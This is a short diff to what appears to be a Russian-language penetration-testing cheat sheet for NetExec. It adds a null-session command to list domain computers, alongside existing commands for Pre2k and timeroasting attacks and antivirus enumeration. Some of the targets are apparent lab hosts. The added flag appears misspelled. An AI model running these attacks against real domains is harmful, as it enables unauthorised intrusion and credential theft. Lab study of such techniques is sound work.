@@ -93,6 +93,8 @@
 
 		(атака Pre2k)	nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k		
 
+		(посмотреть все компы в сети) nxc smb <dc> -u '' -p '' --conpeters
+
 		(атака timeroasting)	nxc smb rustykey.htb -M timeroast
 
 		(поиск антивирусов)	nxc smb dc1.corp.com -u 'administrator' -p 'password' -M enum_av		
